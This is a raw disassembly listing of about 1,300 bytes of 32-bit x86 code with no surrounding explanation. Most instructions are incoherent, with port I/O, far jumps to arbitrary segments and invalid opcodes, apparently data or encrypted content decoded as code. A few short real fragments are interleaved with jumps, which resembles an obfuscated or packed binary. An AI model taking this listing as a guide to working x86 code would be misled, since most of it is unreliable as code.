  40fd3d:	pushf  
  40fd3e:	fwait
  40fd3f:	and    ebp,edi
  40fd41:	add    ch,BYTE PTR [esi-0x59df46f8]
  40fd47:	mov    ch,bh
  40fd49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd4a:	in     eax,0x7d
  40fd4c:	js     0x40fd53
  40fd4e:	ja     0x40fcd3
  40fd50:	lea    ebp,[edx]
  40fd52:	imul   ecx,DWORD PTR [ebx+0x17],0x48
  40fd56:	inc    esp
  40fd57:	push   esp
  40fd58:	mov    al,0x7a
  40fd5a:	pop    eax
  40fd5b:	jb     0x40fdd6
  40fd5d:	xor    DWORD PTR [edi],0xffffff98
  40fd60:	leave  
  40fd61:	add    al,0x61
  40fd63:	int    0xd4
  40fd65:	mov    ebp,0x788c887
  40fd6a:	popa   
  40fd6b:	imul   eax,ebx,0x223db027
  40fd71:	and    eax,0xe19ef013
  40fd76:	jmp    0x40fd53
  40fd78:	aaa    
  40fd79:	xchg   ebp,eax
  40fd7a:	or     ebp,ebx
  40fd7c:	sbb    ebx,eax
  40fd7e:	lock sar DWORD PTR [esi-0x4ca161f4],1
  40fd85:	sub    edi,edx
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	inc    edx
  40fdbc:	loopne 0x40fda2
  40fdbe:	addr16 jp 0x40fe0c
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	nop
  40fdc8:	stc    
  40fdc9:	adc    DWORD PTR [ebx-0x24],0xb7f2d285
  40fdd0:	js     0x40fd63
  40fdd2:	mov    ch,0xbc
  40fdd4:	or     ch,dh
  40fdd6:	jl     0x40fd5f
  40fdd8:	leave  
  40fdd9:	jp     0x40fdbb
  40fddb:	push   eax
  40fddc:	sub    BYTE PTR [ebx-0x52b25faa],ah
  40fde2:	push   cs
  40fde3:	fwait
  40fde4:	outs   dx,DWORD PTR ds:[esi]
  40fde5:	daa    
  40fde6:	ss mov bh,0x70
  40fde9:	repnz dec ecx
  40fdeb:	jmp    0xa48aa7fe
  40fdf0:	outs   dx,BYTE PTR ds:[esi]
  40fdf1:	push   ecx
  40fdf2:	pop    esi
  40fdf3:	call   0xc404:0xc52acce0
  40fdfa:	ja     0x40fdd0
  40fdfc:	mov    ds:0x6e7deced,al
  40fe01:	mov    dl,0xd5
  40fe03:	icebp  
  40fe04:	dec    esp
  40fe05:	loopne 0x40fd99
  40fe07:	sahf   
  40fe08:	add    eax,0x3160c700
  40fe0d:	mov    eax,0xa369653f
  40fe12:	sbb    bh,dh
  40fe14:	cmc    
  40fe15:	mov    ebx,0x27afb207
  40fe1a:	out    0xb8,al
  40fe1c:	and    ch,BYTE PTR [edx]
  40fe1e:	sar    BYTE PTR [ecx],cl
  40fe20:	pop    ebp
  40fe21:	mov    ds:0x735c560e,al
  40fe26:	out    0x62,eax
  40fe28:	outs   dx,BYTE PTR ds:[esi]
  40fe29:	push   eax
  40fe2a:	mov    BYTE PTR [esi-0x38c2a58e],ch
  40fe30:	or     esi,DWORD PTR [edi-0x5c2fdc5c]
  40fe36:	daa    
  40fe37:	and    DWORD PTR [eax],edx
  40fe39:	data16 aad 0xf6
  40fe3c:	outs   dx,BYTE PTR ds:[esi]
  40fe3d:	stc    
  40fe3e:	jnp    0x40fdcc
  40fe40:	sbb    BYTE PTR [edi],cl
  40fe42:	sbb    eax,0x1fff0590
  40fe47:	sub    eax,0x1249819b
  40fe4c:	and    al,BYTE PTR [edx+0x23]
  40fe4f:	cmc    
  40fe50:	inc    eax
  40fe51:	rcl    DWORD PTR [esi],cl
  40fe53:	test   eax,0xe739e424
  40fe58:	mov    ch,0x84
  40fe5a:	sbb    dl,BYTE PTR [edx-0x75e2c377]
  40fe60:	xchg   edx,eax
  40fe61:	in     eax,dx
  40fe62:	adc    dh,BYTE PTR [ecx-0xa]
  40fe65:	mov    ecx,0xc746e20a
  40fe6a:	pop    es
  40fe6b:	jmp    0xf8af:0xd7298e8a
  40fe72:	sbb    DWORD PTR [edx],edi
  40fe74:	sub    BYTE PTR [ebx],0x55
  40fe77:	adc    bh,BYTE PTR [edi]
  40fe79:	mov    esi,0xba9fc51a
  40fe7e:	les    cx,DWORD PTR [edi+0x78]
  40fe82:	xchg   ch,ah
  40fe84:	fs ss shr esi,0xa1
  40fe89:	or     bl,BYTE PTR [edi-0x4cc3b5f5]
  40fe8f:	xchg   ebx,eax
  40fe90:	ja     0x40fe93
  40fe92:	sbb    al,dh
  40fe94:	ds ss retf 
  40fe97:	cbw    
  40fe99:	loopne 0x40fea1
  40fe9b:	int    0x79
  40fe9d:	xlat   BYTE PTR ds:[ebx]
  40fe9e:	pop    esi
  40fe9f:	test   al,0x28
  40fea1:	or     ebp,DWORD PTR [edx+0x18f41586]
  40fea7:	inc    esp
  40fea8:	sbb    eax,0xb71fc47a
  40fead:	push   ebx
  40feae:	push   es
  40feaf:	push   edi
  40feb0:	pusha  
  40feb1:	daa    
  40feb2:	xor    al,0xa8
  40feb4:	sahf   
  40feb5:	jmp    0x40fe55
  40feb7:	xchg   dl,dl
  40feb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feba:	push   ecx
  40febb:	mov    edx,DWORD PTR [ebx+0x2b2b9e6f]
  40fec1:	rcl    BYTE PTR ds:0xc42b4106,0x10
  40fec8:	inc    edx
  40fec9:	es mov ah,0x91
  40fecc:	out    0xea,eax
  40fece:	nop
  40fecf:	das    
  40fed0:	outs   dx,BYTE PTR ds:[esi]
  40fed1:	test   eax,0xf962d94a
  40fed6:	mov    ecx,0xa0f12202
  40fedb:	pop    esi
  40fedc:	cmp    esp,DWORD PTR [edx]
  40fede:	ret    
  40fedf:	test   eax,0x50ccc220
  40fee4:	jg     0x40ff3c
  40fee6:	ja     0x40fea2
  40fee8:	mov    bh,0xa5
  40feea:	(bad)  
  40feeb:	pop    es
  40feec:	call   0x78c6a90e
  40fef1:	jecxz  0x40fef9
  40fef3:	sub    BYTE PTR [ecx+esi*2+0x56aa9caf],bh
  40fefa:	jnp    0x40ff3d
  40fefc:	push   edx
  40fefd:	sub    BYTE PTR [ebp-0x4c578fa8],ah
  40ff03:	dec    eax
  40ff04:	scas   eax,DWORD PTR es:[edi]
  40ff05:	jb     0x40fea4
  40ff07:	push   0x7a
  40ff09:	fisub  DWORD PTR [eax+ebx*2]
  40ff0c:	lds    esp,FWORD PTR ds:0x84150b61
  40ff12:	repz sub BYTE PTR [edi],ch
  40ff15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff16:	fstp   DWORD PTR ds:0x55f7e8ac
  40ff1c:	repz fisttp DWORD PTR [edi+ebp*2]
  40ff20:	push   ebx
  40ff21:	jmp    0xef3c:0xdc8b8386
  40ff28:	dec    DWORD PTR [eax]
  40ff2a:	test   DWORD PTR [esi+eax*1+0x86316d5],0xccae0436
  40ff35:	cmc    
  40ff36:	xor    eax,0x3eb0a058
  40ff3b:	(bad)  
  40ff3c:	dec    ebx
  40ff3d:	stos   DWORD PTR es:[edi],eax
  40ff3e:	xchg   edx,eax
  40ff3f:	loop   0x40ff1f
  40ff41:	sub    eax,0x17e85942
  40ff46:	jl     0x40ff5a
  40ff48:	in     eax,0x30
  40ff4a:	ins    DWORD PTR es:[edi],dx
  40ff4b:	es sub eax,0x3d094bf8
  40ff51:	sbb    BYTE PTR [esi-0x51],0x1e
  40ff55:	out    0x4b,eax
  40ff57:	ja     0x40ff1a
  40ff59:	in     al,dx
  40ff5a:	push   ecx
  40ff5b:	xor    eax,0xf36416d8
  40ff60:	cmp    BYTE PTR [eax+0x3a2e914f],dl
  40ff66:	push   edi
  40ff67:	jae    0x40ff4c
  40ff69:	mov    bl,0x43
  40ff6b:	inc    eax
  40ff6c:	repnz hlt 
  40ff6e:	adc    al,0x6a
  40ff70:	cmc    
  40ff71:	adc    esp,0x54
  40ff74:	dec    edx
  40ff75:	xor    BYTE PTR [eax-0x37c1825e],ch
  40ff7b:	retf   0x5d25
  40ff7e:	cwde   
  40ff7f:	int3   
  40ff80:	adc    al,0x26
  40ff82:	adc    eax,ebp
  40ff84:	pushf  
  40ff85:	(bad)  
  40ff86:	sub    BYTE PTR [ebp-0x55],bl
  40ff89:	cdq    
  40ff8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff8b:	sbb    bl,BYTE PTR [edx]
  40ff8d:	xchg   edi,eax
  40ff8e:	shl    BYTE PTR [edi+eiz*8-0x6b079f27],0x95
  40ff96:	inc    edi
  40ff97:	(bad)  
  40ff98:	xchg   ebx,eax
  40ff99:	addr16 add eax,0xec244bd1
  40ff9f:	icebp  
  40ffa0:	and    BYTE PTR [esi-0x54],0x46
  40ffa4:	bound  ebx,QWORD PTR [ebx-0x1ae32792]
  40ffaa:	cs aaa 
  40ffac:	adc    al,0x7
  40ffae:	(bad)  
  40ffaf:	idiv   BYTE PTR [eax]
  40ffb1:	pop    esp
  40ffb2:	sbb    al,bh
  40ffb4:	cmp    eax,0xa8f85001
  40ffb9:	or     BYTE PTR [esi],bl
  40ffbb:	int    0x63
  40ffbd:	mov    dl,0x28
  40ffbf:	and    DWORD PTR [ebp-0x4c],edx
  40ffc2:	sub    al,0x62
  40ffc4:	xchg   ebp,eax
  40ffc5:	sub    al,0xff
  40ffc7:	and    al,0xc7
  40ffc9:	xchg   ebp,eax
  40ffca:	jp     0x40fff3
  40ffcc:	popf   
  40ffcd:	or     eax,0x3769f89d
  40ffd2:	add    ch,BYTE PTR [ebp-0x7d42263e]
  40ffd8:	hlt    
  40ffd9:	jmp    0xfefe:0xa8af
  40ffdf:	out    dx,eax
  40ffe0:	xor    edx,edx
  40ffe2:	push   ss
  40ffe3:	mov    dl,0xe7
  40ffe5:	sti    
  40ffe6:	inc    edi
  40ffe7:	or     BYTE PTR [edi],dl
  40ffe9:	inc    edx
  40ffea:	add    al,0xeb
  40ffec:	jmp    0xf1eaf094
  40fff1:	mov    ah,BYTE PTR [edi+0x62c9eab4]
  40fff7:	mov    esi,0x4742fe4a
  40fffc:	pop    edi
  40fffd:	fistp  DWORD PTR [edx+0x34]
  410000:	sbb    bl,BYTE PTR [esi+0x3b5f1ad7]
  410006:	lds    eax,FWORD PTR [eax]
  410008:	adc    BYTE PTR [esi],0xd9
  41000b:	scas   al,BYTE PTR es:[edi]
  41000c:	xchg   edi,eax
  41000d:	fcom   DWORD PTR [edi+0x57fe863]
  410013:	mov    ah,0x56
  410015:	jp     0x40ffeb
  410017:	pop    edx
  410018:	clc    
  410019:	adc    esp,DWORD PTR [edx-0x48]
  41001c:	mov    bh,0xba
  41001e:	lods   eax,DWORD PTR ds:[esi]
  41001f:	jecxz  0x41000b
  410021:	mov    ch,0xe3
  410023:	mov    al,ds:0xcfeee5d9
  410028:	pop    es
  410029:	xchg   esp,eax
  41002a:	popa   
  41002b:	(bad)  
  41002c:	stc    
  41002d:	rcr    DWORD PTR [ecx-0x745204f3],0x5d
  410034:	lock sub ebx,edi
  410037:	cmp    ebx,edx
  410039:	ja     0x41004b
  41003f:	mov    edx,DWORD PTR [ebp-0x4]
  410042:	xor    edx,eax
  410044:	add    edx,ecx
  410046:	jmp    0x41220c
  41004b:	mov    edx,DWORD PTR [ebp-0x2c]
  41004e:	mov    edi,DWORD PTR [ebp-0x4]
  410051:	xor    edx,eax
  410053:	xor    edi,eax
  410055:	add    edi,ecx
  410057:	jmp    0x4102df
  41005c:	sar    DWORD PTR [eax+edx*8],cl
  41005f:	int    0xd7
  410061:	(bad)  
  410063:	ret    0x69c5
  410066:	xchg   ebx,eax
  410067:	daa    
  410068:	nop
  410069:	mov    eax,0x48e7ee22
  41006e:	js     0x4100e8
  410070:	in     eax,0x7e
  410072:	js     0x4100ec
  410074:	sar    BYTE PTR [ebx],cl
  410076:	mov    eax,0x8a0893f5
  41007b:	pop    ebp
  41007c:	clc    
  41007d:	into   
  41007e:	jnp    0x410056
  410080:	out    dx,eax
  410081:	pop    eax
  410082:	dec    eax
  410083:	setl   BYTE PTR [eax-0x23d57379]
  41008a:	data16 jecxz 0x410108
  41008d:	dec    eax
  41008e:	rcl    BYTE PTR [esi+eax*2+0xa200281],cl
  410095:	jns    0x4100e8
  410097:	in     eax,0xd1
  410099:	sub    al,ah
  41009b:	mov    edx,0x8fb240d
  4100a0:	ss mov ch,0x37
  4100a3:	das    
  4100a4:	jnp    0x4100df
  4100a6:	(bad)  
  4100a7:	xor    al,0x30
  4100a9:	xor    bl,BYTE PTR [ebx]
  4100ab:	int3   
  4100ac:	or     BYTE PTR [edx],0xfb
  4100af:	and    eax,0x1b47a843
  4100b4:	cmc    
  4100b5:	jp     0x41006a
  4100b7:	rcl    BYTE PTR [eax+edx*4+0x531577b7],1
  4100be:	mov    bh,bh
  4100c0:	inc    eax
  4100c1:	stos   DWORD PTR es:[edi],eax
  4100c2:	imul   edi,ebx,0xb1ec6242
  4100c8:	sbb    al,0x70
  4100ca:	and    eax,0x71be7e1e
  4100cf:	rcl    ecx,0xab
  4100d2:	pop    esp
  4100d3:	cmp    ebx,DWORD PTR [edi+0x7]
  4100d6:	and    al,0xb7
  4100d8:	and    al,0x2b
  4100da:	stc    
  4100db:	outs   dx,DWORD PTR ds:[esi]
  4100dc:	inc    ebp
  4100dd:	imul   ebx,ecx,0x10
  4100e0:	adc    edi,ecx
  4100e2:	dec    edi
  4100e3:	inc    esi
  4100e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100e5:	int3   
  4100e6:	sbb    DWORD PTR [ebx+0x780a975a],ebx
  4100ec:	clc    
  4100ed:	add    al,bl
  4100ef:	adc    BYTE PTR [edx],cl
  4100f1:	and    edi,ebx
  4100f3:	add    al,dl
  4100f5:	or     esi,esp
  4100f7:	jbe    0x410124
  4100f9:	cmp    edx,ebp
  4100fb:	inc    ecx
  4100fc:	(bad)  
  4100fe:	and    edx,edx
  410100:	gs sbb edx,edi
  410103:	cli    
  410104:	sbb    dh,BYTE PTR [esi+0x344362eb]
  41010a:	cmc    
  41010b:	adc    esi,DWORD PTR [edi-0x4f3411c9]
  410111:	xchg   ebp,eax
  410112:	fwait
  410113:	and    ah,BYTE PTR [edx-0x35]
  410116:	xchg   ebx,eax
  410117:	sub    cl,BYTE PTR [ecx-0x33]
  41011a:	int    0xc3
  41011c:	or     eax,0xacb57ad2
  410121:	inc    esp
  410122:	adc    cl,ah
  410124:	mov    esp,0xf57964f2
  410129:	fs sti 
  41012b:	outs   dx,DWORD PTR ds:[esi]
  41012c:	jmp    0x4584:0x8878e297
  410133:	mov    ch,dh
  410135:	jmp    0x410146
  410137:	pop    ebp
  410138:	cmp    al,0x89
  41013a:	daa    
  41013b:	fisubr WORD PTR [edx+0x52fdaf66]
  410141:	jle    0x41018b
  410143:	aas    
  410144:	push   esp
  410145:	sbb    al,0x45
  410147:	fist   DWORD PTR [esi+0x6d]
  41014a:	shl    BYTE PTR [edx],cl
  41014c:	add    dh,BYTE PTR [esi-0x77]
  41014f:	retf   0xefe9
  410152:	adc    al,0xea
  410154:	inc    esp
  410155:	mov    dh,0xf0
  410157:	test   DWORD PTR [ecx],eax
  410159:	in     al,dx
  41015a:	nop
  41015b:	pushf  
  41015c:	or     al,0x2c
  41015e:	in     al,dx
  41015f:	test   ax,0xd031
  410163:	sbb    eax,0x9c30b534
  410168:	xchg   ecx,edi
  41016a:	jns    0x410117
  41016c:	popf   
  41016d:	mov    WORD PTR ds:0x830691b7,ss
  410173:	adc    eax,0xac3fe0e7
  410178:	cdq    
  410179:	out    dx,al
  41017a:	ds inc esp
  41017c:	mov    BYTE PTR [ecx],ch
  41017e:	(bad)  
  410180:	push   eax
  410181:	push   edi
  410182:	dec    esp
  410183:	inc    eax
  410184:	ja     0x4101b4
  410186:	(bad)  
  410187:	mov    bl,0x80
  410189:	xchg   edi,eax
  41018a:	clc    
  41018b:	stos   BYTE PTR es:[edi],al
  41018c:	push   eax
  41018d:	(bad)  
  41018e:	into   
  41018f:	mov    al,ds:0x655fbda8
  410194:	mov    bh,0x4e
  410196:	mov    DWORD PTR [esi],edi
  410198:	dec    edi
  410199:	sub    esi,0x1e7cbe52
  41019f:	sub    DWORD PTR [edx+0x731474bc],edx
  4101a5:	push   esp
  4101a6:	sbb    edx,DWORD PTR [ebx]
  4101a8:	(bad)  
  4101a9:	mov    eax,ds:0xbc381f75
  4101ae:	hlt    
  4101af:	xchg   BYTE PTR [esi+0x6357a83b],ah
  4101b5:	pop    esp
  4101b6:	pop    es
  4101b7:	sahf   
  4101b8:	std    
  4101b9:	out    dx,eax
  4101ba:	scas   eax,DWORD PTR es:[edi]
  4101bb:	xchg   esp,eax
  4101bc:	cwde   
  4101bd:	adc    ebp,DWORD PTR [ecx+0x5a616be]
  4101c3:	xchg   edi,eax
  4101c4:	xchg   DWORD PTR [ebx+0x605c6fe5],ebp
  4101ca:	sbb    eax,0xa5829732
  4101cf:	bound  edi,QWORD PTR [ebp+0x204a565f]
  4101d5:	popf   
  4101d6:	xor    eax,0x64e01fdc
  4101db:	jg     0x41023f
  4101dd:	sub    edx,esi
  4101df:	pop    ebx
  4101e0:	cmc    
  4101e1:	xor    bh,BYTE PTR [ebx]
  4101e3:	lods   al,BYTE PTR ds:[esi]
  4101e4:	adc    al,0x1
  4101e6:	mul    DWORD PTR [ebx+0x3f]
  4101e9:	sub    esp,DWORD PTR [edx]
  4101eb:	cdq    
  4101ec:	ret    0x6134
  4101ef:	(bad)  
  4101f0:	and    eax,0x3b4daeb
  4101f5:	ret    0x6f88
  4101f8:	pop    edx
  4101f9:	pop    ds
  4101fa:	cmp    ch,dl
  4101fc:	xor    eax,0xa40f487
  410201:	loope  0x41023d
  410203:	jno    0x410256
  410205:	dec    ecx
  410206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410207:	and    eax,0x71b76085
  41020c:	sbb    al,0x68
  41020e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41020f:	ins    BYTE PTR es:[edi],dx
  410210:	pushf  
  410211:	leave  
  410212:	pop    esp
  410213:	fcom   QWORD PTR ds:0xc98995e4
  410219:	inc    esi
  41021a:	xchg   edx,eax
  41021b:	sbb    DWORD PTR [esi+0x9a6f2d5],ecx
  410221:	addr16 enter 0xb615,0xa5
  410226:	cli    
  410227:	fcomip st,st(3)
  410229:	push   esp
  41022a:	dec    ebx
  41022b:	mov    ecx,0xecb42122
  410230:	inc    ebx
  410231:	inc    edi
  410232:	xor    DWORD PTR [eax-0x418e5034],eax
  410238:	cmp    bl,BYTE PTR [ebx+ebp*1]
  41023b:	pop    esp
  41023c:	fwait
  41023d:	add    DWORD PTR [ecx-0x77],esi
  410240:	add    DWORD PTR [ebp-0x1a0b0623],esi
  410246:	dec    esp
  410247:	retf   0x24ce
  41024a:	rol    bl,1
  41024c:	inc    edi
  41024d:	add    al,0xfc
  41024f:	mov    ds:0xc8fd4a4,eax
  410254:	das    
  410255:	leave  
  410256:	pop    ds
  410257:	inc    eax
  410259:	mov    DWORD PTR [esi],edi
  41025b:	xor    eax,0x77ca00ed
  410260:	and    edx,DWORD PTR [edx+edx*2+0x77]
  410264:	mov    DWORD PTR [edi+0x472bc454],ebx
  41026a:	adc    BYTE PTR [esi+0x7323c48a],cl
  410270:	pop    esp
  410271:	ror    BYTE PTR [eax+eiz*1+0x3e8fc013],cl
  410278:	test   al,0xad
  41027a:	adc    al,0x5e
  41027c:	dec    esi
  41027d:	push   edi
  41027e:	cmp    eax,DWORD PTR [esi+ebx*4-0x6]
  410282:	cmp    esi,ebp
  410284:	icebp  
  410285:	sub    al,0x98
  410287:	push   ebx
  410288:	jg     0x4102f4
  41028a:	(bad)  
  41028b:	xor    ebp,edi
  41028d:	cmp    cl,al
  41028f:	add    esp,DWORD PTR [eax+0x580fb729]
  410295:	mov    ebp,0xfc8ba5d8
  41029a:	adc    al,0x9f
  41029c:	daa    
  41029d:	aad    0x88
  41029f:	sub    DWORD PTR [esi],0xd0150d3b
  4102a5:	loopne 0x410303
  4102a7:	jae    0x4102a8
  4102a9:	iret   
  4102aa:	pcmpgtb mm5,QWORD PTR [ebp+0x2a]
  4102ae:	mov    DWORD PTR [eax+edi*2+0x64],esp
  4102b2:	out    0xf7,eax
  4102b4:	sub    eax,0xab7f099e
  4102b9:	mov    ebp,0x1704728a
  4102be:	dec    esi
  4102bf:	test   DWORD PTR [esi+edi*1],0xd24e08e5
  4102c6:	in     al,dx
  4102c7:	dec    ebx
  4102c8:	sbb    eax,0x14425b5e
  4102cd:	sub    eax,esp
  4102cf:	cli    
  4102d0:	add    BYTE PTR [edx+0x29],0xf7
  4102d4:	outs   dx,BYTE PTR ds:[esi]
  4102d5:	nop
  4102d6:	clc    
  4102d7:	and    BYTE PTR [ebx-0x14920790],ah
  4102dd:	or     BYTE PTR [ebx+0x3],dl
  4102e0:	shr    ecx,1
  4102e2:	add    DWORD PTR [edx],0x0
  4102e5:	add    bl,al
  4102e7:	int    0xc7
  4102e9:	into   
  4102ea:	(bad)  
  4102ec:	(bad)  
  4102ee:	xchg   BYTE PTR [edi],dh
  4102f0:	jle    0x410290
  4102f2:	loopne 0x410275
  4102f4:	inc    eax
  4102f5:	fimul  WORD PTR [esi+ecx*2+0x78]
  4102f9:	js     0x4102e0
  4102fb:	jle    0x410375
  4102fd:	js     0x410376
  4102ff:	pop    ss
  410300:	sbb    DWORD PTR [eax],ebp
  410302:	pop    ss
  410303:	in     al,dx
  410304:	pop    ebx
  410305:	icebp  
  410306:	lds    ecx,FWORD PTR [ecx-0x3f]
  410309:	test   BYTE PTR [eax],dh
  41030b:	out    dx,al
  41030c:	out    0xcd,al
  41030e:	mov    DWORD PTR [ebp+0x14ce4542],eax
  410314:	call   0x14d0b73f
  410319:	xchg   edx,eax
  41031a:	fldz   
  41031c:	xchg   edx,eax
  41031d:	shl    BYTE PTR [ebx-0x35],1
  410320:	push   ebx
  410321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410322:	push   esi
  410323:	mov    ebx,0x3bab09b8
  410328:	pop    esp
  410329:	mov    ebx,0x4d9684c8
  41032e:	mov    BYTE PTR [ecx+0x152e3989],dh
  410334:	int3   
  410335:	mov    ecx,0xf6c4ed33
  41033a:	cmp    ebp,0xb9bc2444
  410340:	mov    ch,0xb4
  410342:	mov    ah,ah
  410344:	das    
  410345:	ror    edi,0x92
  410348:	in     al,0x39
  41034a:	mov    esi,0xf7d5b439
  41034f:	aam    0x73
  410351:	inc    ecx
  410353:	or     al,0x40
  410355:	loopne 0x410383
  410357:	fdivp  st(2),st
  410359:	inc    esi
  41035a:	or     ebx,DWORD PTR [ebp+0x78]
  41035d:	inc    ebp
  41035e:	(bad)  
  41035f:	loop   0x410329
  410361:	sbb    al,0xcb
  410363:	out    0x78,al
  410365:	or     eax,0x54e6cdeb
  41036a:	jb     0x41031f
  41036c:	xor    BYTE PTR es:[esi+0x58],ah
  410370:	fwait
  410371:	int    0x1d
  410373:	dec    esp
  410374:	idiv   edx
  410376:	mov    ebp,0x4d634cc1
  41037b:	popa   
  41037c:	call   FWORD PTR [ebx-0x45d8cd3f]
  410382:	xor    al,0x33
  410384:	(bad)  
  410385:	icebp  
  410386:	mov    ch,0xb3
  410388:	ror    BYTE PTR [eax-0x3e],1
  41038b:	or     DWORD PTR [ebp-0x1f],eax
  41038e:	xchg   esp,eax
  41038f:	sub    eax,0x7c17a682
  410394:	pop    edi
  410395:	mov    dh,dh
  410397:	mov    esp,DWORD PTR [edx]
  410399:	inc    ecx
  41039a:	adc    edx,esi
  41039c:	jmp    0x410365
  41039e:	push   edi
  41039f:	adc    BYTE PTR [edi+0x2f],0x74
  4103a3:	xor    al,0x81
  4103a5:	icebp  
  4103a6:	xor    al,0x8e
  4103a8:	fiadd  WORD PTR [ebp+0x4f]
  4103ab:	fst    QWORD PTR [eax-0x46]
  4103ae:	inc    esi
  4103af:	aas    
  4103b0:	mov    eax,ds:0x59ff85e1
  4103b5:	add    dl,dl
  4103b7:	pop    edi
  4103b8:	jg     0x4103f7
  4103ba:	cmp    al,0xe4
  4103bc:	call   0xa32d:0xe7c8adff
  4103c3:	add    ch,BYTE PTR [ebp-0x6a40eb35]
  4103c9:	outs   dx,DWORD PTR ds:[esi]
  4103ca:	cdq    
  4103cb:	les    ebp,FWORD PTR [ecx]
  4103cd:	mov    DWORD PTR [ecx],ebx
  4103cf:	jp     0x41036a
  4103d1:	xchg   ebp,eax
  4103d2:	adc    eax,0x9f3a2615
  4103d7:	adc    eax,0xaabfabde
  4103dc:	fsubr  DWORD PTR [eax+eiz*1+0x5d]
  4103e0:	xor    dl,0x67
  4103e3:	xor    BYTE PTR [ebx+0x7d49ee50],ch
  4103e9:	cmp    eax,0x537b5255
  4103ee:	jmp    0x6fc0:0x2723cb5a
  4103f5:	dec    edx
  4103f6:	fld    QWORD PTR [eax-0x1cf5916a]
  4103fc:	jecxz  0x410390
  4103fe:	nop
  4103ff:	sub    DWORD PTR [ebp+0x50],edx
  410402:	or     eax,DWORD PTR [ebp+ecx*4+0x117f6686]
  410409:	jmp    0x41ef8af4
  41040e:	push   edi
  41040f:	push   0x28
  410411:	retf   
  410412:	sbb    ch,BYTE PTR [edi+eiz*8+0xb2a66f2]
  410419:	pop    eax
  41041a:	out    dx,al
  41041b:	add    al,0xd5
  41041d:	cmp    al,0x15
  41041f:	icebp  
  410420:	xchg   DWORD PTR [eax+0x2a],edx
  410423:	pop    ds
  410424:	fwait
  410425:	and    esi,DWORD PTR [ecx]
  410427:	pop    ss
  410428:	ss dec eax
  41042a:	(bad)
  41042d:	and    DWORD PTR [esi-0x466a7e10],ecx
  410433:	add    ah,BYTE PTR [esi-0x4bbad230]
  410439:	push   ds
  41043a:	ins    BYTE PTR es:[edi],dx
  41043b:	not    edi
  41043d:	sub    ecx,DWORD PTR [edx]
  41043f:	aam    0x93
  410441:	inc    ebx
  410442:	mov    bl,0x91
  410444:	cmp    eax,0x1a1a91b2
  410449:	mov    esp,0x71ba2345
  41044e:	ins    DWORD PTR es:[edi],dx
  41044f:	dec    esp
  410450:	mov    esi,0x6fbfb64d
  410455:	out    0x10,al
  410457:	mov    dh,BYTE PTR [ecx+0x43]
  41045a:	idiv   ah
  41045c:	into   
  41045d:	into   
  41045e:	mov    al,0xda
  410460:	jge    0x410401
  410462:	jnp    0x4103ec
  410464:	cdq    
  410465:	jb     0x410411
  410467:	icebp  
  410468:	mov    al,0x8c
  41046a:	and    BYTE PTR [edi-0x99b48ed],0x93
  410471:	inc    esp
  410472:	mov    esp,0x2fa33791
  410477:	arpl   ax,cx
  410479:	cmp    DWORD PTR [ebx+0x7a],edx
  41047c:	(bad)  
  41047d:	mov    ch,0xcd
  41047f:	lock push 0xffffff98
  410482:	add    al,0xb6
  410484:	mov    edi,0xb89e7d29
  410489:	inc    ecx
  41048a:	imul   eax,ebp,0xffffff86
  41048d:	cmc    
  41048e:	jmp    0x410438
  410490:	leave  
  410491:	push   esp
  410492:	fwait
  410493:	call   0x12f5:0x4ecbd2d8
  41049a:	or     BYTE PTR [esi+0x7d],0x8d
  41049e:	loope  0x4104c4
  4104a0:	inc    eax
  4104a1:	test   BYTE PTR [ebp+edi*1+0x42],bh
  4104a5:	scas   al,BYTE PTR es:[edi]
  4104a6:	xchg   BYTE PTR [ebx+0x2a175f96],ch
  4104ac:	cmp    BYTE PTR [eax+0x36],cl
  4104af:	xchg   ebx,eax
  4104b0:	test   BYTE PTR [eax-0x70],dh
  4104b3:	pop    ss
  4104b4:	pop    ss
  4104b5:	stos   BYTE PTR es:[edi],al
  4104b6:	xchg   edi,eax
  4104b7:	mov    ds:0x90560087,eax
  4104bc:	mov    ecx,DWORD PTR [eax]
  4104be:	gs stos DWORD PTR es:[edi],eax
  4104c0:	shr    DWORD PTR [ebx-0xd5f4230],1
  4104c6:	mov    esp,DWORD PTR [edi-0x5a]
  4104c9:	or     eax,0x6fc63a52
  4104ce:	bound  edx,QWORD PTR [ebx]
  4104d0:	imul   BYTE PTR [ecx+0x6cf1fe67]
  4104d6:	push   ebx
  4104d7:	xor    eax,0x96fbf20b
  4104dc:	leave  
  4104dd:	fild   DWORD PTR [esi+0x7c]
  4104e0:	(bad)  
  4104e1:	and    dl,al
  4104e3:	inc    ebp
  4104e4:	pop    ecx
  4104e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104e6:	pop    ds
  4104e7:	aaa    
  4104e8:	mov    dl,0xac
  4104ea:	aas    
  4104eb:	call   0xf57c:0x8a8d25ec
  4104f2:	shl    dh,1
  4104f4:	or     ch,al
  4104f6:	add    eax,0xdc6535e2
  4104fb:	cmp    al,0x56
  4104fd:	and    ecx,edx
  4104ff:	call   0xbf796f27
  410504:	mov    al,ds:0x9e823e0d
  410509:	mov    ebp,0x2b40bf78
  41050e:	and    eax,0x7a5b2a6b
  410513:	mov    edx,fs
  410515:	xchg   ecx,eax
  410516:	cmp    al,0xaa
  410518:	fimul  DWORD PTR [eiz*1+0x31586c7e]
